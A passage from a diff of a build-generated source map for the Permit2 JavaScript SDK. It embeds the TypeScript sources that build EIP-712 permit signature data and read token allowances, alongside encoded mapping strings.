OAAO,CAACG,WAAW;AAE1B;AAEA,SAASC,sCAAsC,CAACJ,OAAgB;EAC9D;IACEK,8BAA8B,EAAE,CAC9B;MAAEzC,IAAI,EAAE,WAAW;MAAEG,IAAI,EAAE;KAAsB,EACjD;MAAEH,IAAI,EAAE,SAAS;MAAEG,IAAI,EAAE;KAAW,EACpC;MAAEH,IAAI,EAAE,OAAO;MAAEG,IAAI,EAAE;KAAW,EAClC;MAAEH,IAAI,EAAE,UAAU;MAAEG,IAAI,EAAE;KAAW,EACrC;MAAEH,IAAI,EAAE,SAAS;MAAEG,IAAI,EAAEiC,OAAO,CAACE;KAAiB,CACnD;IACDN,gBAAgB,EAAEH;KACfO,OAAO,CAACG,WAAW;AAE1B;AAEA,SAASG,oBAAoB,CAAChC,MAAoD;EAChF,OAAO,CAACC,KAAK,CAACC,OAAO,CAACF,MAAM,CAACiC,SAAS,CAAC;AACzC;AAEA,IAAsBC,iBAAiB;;;;EAIrC;;;EAGA,kBACc7B,aAAa,GAApB,uBACLL,MAAoD,EACpDZ,cAAsB,EACtBC,OAAe,EACfqC,OAAiB;IAEjB,CAAU1C,cAAc,CAACsB,GAAG,CAACN,MAAM,CAACmC,QAAQ,CAAC,2CAA7C3B,SAAS,QAAsC,2BAA2B,IAA1EA,SAAS;IACT,CAAUzB,iBAAiB,CAACuB,GAAG,CAACN,MAAM,CAACgB,KAAK,CAAC,2CAA7CR,SAAS,QAAsC,oBAAoB,IAAnEA,SAAS;IAET,IAAMC,MAAM,GAAGtB,aAAa,CAACC,cAAc,EAAEC,OAAO,CAAC;IACrD,IAAI2C,oBAAoB,CAAChC,MAAM,CAAC,EAAE;MAChCoC,wBAAwB,CAACpC,MAAM,CAACiC,SAAS,CAAC;MAC1C,IAAMtB,KAAK,GAAGe,OAAO,GAAGD,iCAAiC,CAACC,OAAO,CAAC,GAAGN,0BAA0B;MAC/F,IAAMR,MAAM,GAAGc,OAAO,GAAGW,MAAM,CAACC,MAAM,CAACtC,MAAM,EAAE;QAAE0B,OAAO,EAAEA,OAAO,CAACA;OAAS,CAAC,GAAG1B,MAAM;MACrF,OAAO;QACLS,MAAM,EAANA,MAAM;QACNE,KAAK,EAALA,KAAK;QACLC,MAAM,EAANA;OACD;KACF,MAAM;MACLZ,MAAM,CAACiC,SAAS,CAACpB,OAAO,CAACuB,wBAAwB,CAAC;MAClD,IAAMzB,MAAK,GAAGe,OAAO,GAAGI,sCAAsC,CAACJ,OAAO,CAAC,GAAGH,gCAAgC;MAC1G,IAAMX,OAAM,GAAGc,OAAO,GAAGW,MAAM,CAACC,MAAM,CAACtC,MAAM,EAAE;QAAE0B,OAAO,EAAEA,OAAO,CAACA;OAAS,CAAC,GAAG1B,MAAM;MACrF,OAAO;QACLS,MAAM,EAANA,MAAM;QACNE,KAAK,EAALA,MAAK;QACLC,MAAM,EAANA;OACD;;GAEJ;EAAA,kBAEaE,IAAI,GAAX,cACLd,MAAoD,EACpDZ,cAAsB,EACtBC,OAAe,EACfqC,OAAiB;IAEjB,4BAAkCQ,iBAAiB,CAAC7B,aAAa,CAACL,MAAM,EAAEZ,cAAc,EAAEC,OAAO,EAAEqC,OAAO,CAAC;MAAnGjB,MAAM,yBAANA,MAAM;MAAEE,KAAK,yBAALA,KAAK;MAAEC,MAAM,yBAANA,MAAM;IAC7B,OAAOG,iBAAiB,CAACD,IAAI,CAACL,MAAM,EAAEE,KAAK,EAAEC,MAAM,CAAC;GACrD;EAAA;AAAA;AAGH,SAASwB,wBAAwB,CAACG,WAA6B;EAC7D,CAAUzD,0BAA0B,CAACwB,GAAG,CAACiC,WAAW,CAACtB,MAAM,CAAC,2CAA5DT,SAAS,QAAqD,qBAAqB,IAAnagC,iBAAiB;EAG5B,2BAAoBC,QAAkB,EAAUrD,cAAsB;IAAlD,aAAQ,GAARqD,QAAQ;IAAoB,mBAAc,GAAdrD,cAAc;IAC5D,IAAI,CAACsD,OAAO,GAAG,IAAIC,QAAQ,CAAC,IAAI,CAACvD,cAAc,EAAEwD,UAAU,EAAE,IAAI,CAACH,QAAQ,CAAC;;EAC5E;EAAA,OAEKI,gBAAgB;IAAA,gGAAtB,iBAAuBC,KAAa,EAAEC,KAAa,EAAEC,OAAe;MAAA;QAAA;UAAA;YAAA;cAAA;cAAA,OACrD,IAAI,CAACN,OAAO,CAACO,SAAS,CAACF,KAAK,EAAED,KAAK,EAAEE,OAAO,CAAC;YAAA;cAAA;YAAA;YAAA;cAAA;;;;KAC3D;IAAA;MAAA;;IAAA;;EAAA,OAEKE,YAAY;IAAA,4FAAlB,kBAAmBJ,KAAa,EAAEC,KAAa,EAAEC,OAAe;MAAA;QAAA;UAAA;YAAA;cAAA;cAAA,OAChD,IAAI,CAACH,gBAAgB,CAACC,KAAK,EAAEC,KAAK,EAAEC,OAAO,CAAC;YAAA;cAAA,iDAAE/B,MAAM;YAAA;YAAA;cAAA;;;;KACnE;IAAA;MAAA;;IAAA;;EAAA,OAEKkC,QAAQ;IAAA,wFAAd,kBAAeL,KAAa,EAAEC,KAAa,EAAEC,OAAe;MAAA;QAAA;UAAA;YAAA;cAAA;cAAA,OAC5C,IAAI,CAACH,gBAAgB,CAACC,KAAK,EAAEC,KAAK,EAAEC,OAAO,CAAC;YAAA;cAAA,iDAAEhC,KAAK;YAAA;YAAA;cAAA;;;;KAClE;IAAA;MAAA;;IAAA;;EAAA,OAEKoC,aAAa;IAAA,6FAAnB,kBAAoBN,KAAa,EAAEC,KAAa,EAAEC,OAAe;MAAA;QAAA;UAAA;YAAA;cAAA;cAAA,OACjD,IAAI,CAACH,gBAAgB,CAACC,KAAK,EAAEC,KAAK,EAAEC,OAAO,CAAC;YAAA;cAAA,iDAAE9B,UAAU;YAAA;YAAA;cAAA;;;;KACvE;IAAA;MAAA;;IAAA;;EAAA;AAAA;;;;"}
\ No newline at end of file
+{"version":3,"file":"permit2-sdk.esm.js","sources":["../src/constants.ts","../src/domain.ts","../src/allowanceTransfer.ts","../src/signatureTransfer.ts","../src/providers/AllowanceProvider.ts"],"sourcesContent":["import { BigNumber } from '@ethersproject/bignumber'\n\nexport const PERMIT2_ADDRESS = '0x00000000BD0047637ac6BA3af44b52005ceD9557'\n\nexport const MaxUint48 = BigNumber.from('0xffffffffffff')\nexport const MaxUint160 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff')\nexport const MaxUint256 = BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')\n\n// alias max types for their usages\n// allowance transfer types\nexport const MaxAllowanceTransferAmount = MaxUint160\nexport const MaxAllowanceExpiration = MaxUint48\nexport const MaxOrderedNonce = MaxUint48\n\n// signature transfer types\nexport const MaxSignatureTransferAmount = MaxUint256\nexport const MaxUnorderedNonce = MaxUint256\nexport const MaxSigDeadline = MaxUint256\n\nexport const InstantExpiration: BigNumber = BigNumber.from(0)\n","import { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\n\nconst PERMIT2_DOMAIN_NAME = 'Permit2'\n\nexport function permit2Domain(permit2Address: string, chainId: number): TypedDataDomain {\n  return {\n    name: PERMIT2_DOMAIN_NAME,\n    chainId,\n    verifyingContract: permit2Address,\n  }\n}\n\nexport type PermitData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: any\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { MaxSigDeadline, MaxOrderedNonce, MaxAllowanceTransferAmount, MaxAllowanceExpiration } from './constants'\nimport { permit2Domain } from './domain'\n\nexport interface PermitDetails {\n  token: string\n  amount: BigNumberish\n  expiration: BigNumberish\n  nonce: BigNumberish\n}\n\nexport interface PermitSingle {\n  details: PermitDetails\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport interface PermitBatch {\n  details: PermitDetails[]\n  spender: string\n  sigDeadline: BigNumberish\n}\n\nexport type PermitSingleData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitSingle\n}\n\nexport type PermitBatchData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatch\n}\n\nconst PERMIT_DETAILS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint160' },\n  { name: 'expiration', type: 'uint48' },\n  { name: 'nonce', type: 'uint48' },\n]\n\nconst PERMIT_TYPES = {\n  PermitSingle: [\n    { name: 'details', type: 'PermitDetails' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nconst PERMIT_BATCH_TYPES = {\n  PermitBatch: [\n    { name: 'details', type: 'PermitDetails[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'sigDeadline', type: 'uint256' },\n  ],\n  PermitDetails: PERMIT_DETAILS,\n}\n\nfunction isPermit(permit: PermitSingle | PermitBatch): permit is PermitSingle {\n  return !Array.isArray(permit.details)\n}\n\nexport abstract class AllowanceTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitSingle | PermitBatch,\n    permit2Address: string,\n    chainId: number\n  ): PermitSingleData | PermitBatchData {\n    invariant(MaxSigDeadline.gte(permit.sigDeadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermit(permit)) {\n      validatePermitDetails(permit.details)\n      return {\n        domain,\n        types: PERMIT_TYPES,\n        values: permit,\n      }\n    } else {\n      permit.details.forEach(validatePermitDetails)\n      return {\n        domain,\n        types: PERMIT_BATCH_TYPES,\n        values: permit,\n      }\n    }\n  }\n\n  public static hash(permit: PermitSingle | PermitBatch, permit2Address: string, chainId: number): string {\n    const { domain, types, values } = AllowanceTransfer.getPermitData(permit, permit2Address, chainId)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validatePermitDetails(details: PermitDetails) {\n  invariant(MaxOrderedNonce.gte(details.nonce), 'NONCE_OUT_OF_RANGE')\n  invariant(MaxAllowanceTransferAmount.gte(details.amount), 'AMOUNT_OUT_OF_RANGE')\n  invariant(MaxAllowanceExpiration.gte(details.expiration), 'EXPIRATION_OUT_OF_RANGE')\n}\n","import invariant from 'tiny-invariant'\nimport { TypedDataDomain, TypedDataField } from '@ethersproject/abstract-signer'\nimport { BigNumberish } from '@ethersproject/bignumber'\nimport { _TypedDataEncoder } from '@ethersproject/hash'\nimport { permit2Domain } from './domain'\nimport { MaxSigDeadline, MaxUnorderedNonce, MaxSignatureTransferAmount } from './constants'\n\nexport interface Witness {\n  witness: any\n  witnessTypeName: string\n  witnessType: Record<string, TypedDataField[]>\n}\n\nexport interface TokenPermissions {\n  token: string\n  amount: BigNumberish\n}\n\nexport interface PermitTransferFrom {\n  permitted: TokenPermissions\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport interface PermitBatchTransferFrom {\n  permitted: TokenPermissions[]\n  spender: string\n  nonce: BigNumberish\n  deadline: BigNumberish\n}\n\nexport type PermitTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitTransferFrom\n}\n\nexport type PermitBatchTransferFromData = {\n  domain: TypedDataDomain\n  types: Record<string, TypedDataField[]>\n  values: PermitBatchTransferFrom\n}\n\nconst TOKEN_PERMISSIONS = [\n  { name: 'token', type: 'address' },\n  { name: 'amount', type: 'uint256' },\n]\n\nconst PERMIT_TRANSFER_FROM_TYPES = {\n  PermitTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nconst PERMIT_BATCH_TRANSFER_FROM_TYPES = {\n  PermitBatchTransferFrom: [\n    { name: 'permitted', type: 'TokenPermissions[]' },\n    { name: 'spender', type: 'address' },\n    { name: 'nonce', type: 'uint256' },\n    { name: 'deadline', type: 'uint256' },\n  ],\n  TokenPermissions: TOKEN_PERMISSIONS,\n}\n\nfunction permitTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction permitBatchTransferFromWithWitnessType(witness: Witness): Record<string, TypedDataField[]> {\n  return {\n    PermitBatchWitnessTransferFrom: [\n      { name: 'permitted', type: 'TokenPermissions[]' },\n      { name: 'spender', type: 'address' },\n      { name: 'nonce', type: 'uint256' },\n      { name: 'deadline', type: 'uint256' },\n      { name: 'witness', type: witness.witnessTypeName },\n    ],\n    TokenPermissions: TOKEN_PERMISSIONS,\n    ...witness.witnessType,\n  }\n}\n\nfunction isPermitTransferFrom(permit: PermitTransferFrom | PermitBatchTransferFrom): permit is PermitTransferFrom {\n  return !Array.isArray(permit.permitted)\n}\n\nexport abstract class SignatureTransfer {\n  /**\n   * Cannot be constructed.\n   */\n  private constructor() {}\n\n  // return the data to be sent in a eth_signTypedData RPC call\n  // for signing the given permit data\n  public static getPermitData(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): PermitTransferFromData | PermitBatchTransferFromData {\n    invariant(MaxSigDeadline.gte(permit.deadline), 'SIG_DEADLINE_OUT_OF_RANGE')\n    invariant(MaxUnorderedNonce.gte(permit.nonce), 'NONCE_OUT_OF_RANGE')\n\n    const domain = permit2Domain(permit2Address, chainId)\n    if (isPermitTransferFrom(permit)) {\n      validateTokenPermissions(permit.permitted)\n      const types = witness ? permitTransferFromWithWitnessType(witness) : PERMIT_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    } else {\n      permit.permitted.forEach(validateTokenPermissions)\n      const types = witness ? permitBatchTransferFromWithWitnessType(witness) : PERMIT_BATCH_TRANSFER_FROM_TYPES\n      const values = witness ? Object.assign(permit, { witness: witness.witness }) : permit\n      return {\n        domain,\n        types,\n        values,\n      }\n    }\n  }\n\n  public static hash(\n    permit: PermitTransferFrom | PermitBatchTransferFrom,\n    permit2Address: string,\n    chainId: number,\n    witness?: Witness\n  ): string {\n    const { domain, types, values } = SignatureTransfer.getPermitData(permit, permit2Address, chainId, witness)\n    return _TypedDataEncoder.hash(domain, types, values)\n  }\n}\n\nfunction validateTokenPermissions(permissions: TokenPermissions) {\n  invariant(MaxSignatureTransferAmount.gte(permissions.amount), 'AMOUNT_OUT_OF_RANGE')\n}\n","import { BigNumber } from '@ethersproject/bignumber'\nimport { Provider } from '@ethersproject/providers'\nimport Permit2Abi from '../../abis/Permit2.json'\nimport { Contract } from '@ethersproject/contracts'\n\nexport interface AllowanceData {\n  amount: BigNumber\n  nonce: number\n  expiration: number\n}\n\nexport class AllowanceProvider {\n  private permit2: Contract\n\n  constructor(private provider: Provider, private permit2Address: string) {\n    this.permit2 = new Contract(this.permit2Address, Permit2Abi, this.provider)\n  }\n\n  async getAllowanceData(token: string, owner: string, spender: string): Promise<AllowanceData> {\n    return await this.permit2.allowance(owner, token, spender)\n  }\n\n  async getAllowance(token: string, owner: string, spender: string): Promise<BigNumber> {\n    return (await this.getAllowanceData(token, owner, spender)).amount\n  }\n\n  async getNonce(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).nonce\n  }\n\n  async getExpiration(token: string, owner: string, spender: string): Promise<number> {\n    return (await this.getAllowanceData(token, owner, spender)).expiration\n  }\n}\n"],"names":["PERMIT2_ADDRESS","MaxUint48","BigNumber","from","MaxUint160","MaxUint256","MaxAllowanceTransferAmount","MaxAllowanceExpiration","MaxOrderedNonce","MaxSignatureTransferAmount","MaxUnorderedNonce","MaxSigDeadline","InstantExpiration","PERMIT2_DOMAIN_NAME","permit2Domain","permit2Address","chainId","name","verifyingContract","PERMIT_DETAILS","type","PERMIT_TYPES","PermitSingle","PermitDetails","PERMIT_BATCH_TYPES","PermitBatch","isPermit","permit","Array","isArray","details","AllowanceTransfer","getPermitData","gte","sigDeadline","invariant","domain","validatePermitDetails","types","values","forEach","hash","_TypedDataEncoder","nonce","amount","expiration","TOKEN_PERMISSIONS","PERMIT_TRANSFER_FROM_TYPES","PermitTransferFrom","TokenPermissions","PERMIT_BATCH_TRANSFER_FROM_TYPES","PermitBatchTransferFrom","permitTransferFromWithWitnessType","witness","PermitWitnessTransferFrom","witnessTypeName","witnessType","permitBatchTransferFromWithWitnessType","PermitBatchWitnessTransferFrom","isPermitTransferFrom","permitted","SignatureTransfer","deadline","validateTokenPermissions","Object","assign","permissions","AllowanceProvider","provider","permit2","Contract","Permit2Abi","getAllowanceData","token","owner","spender","allowance","getAllowance","getNonce","getExpiration"],"mappings":"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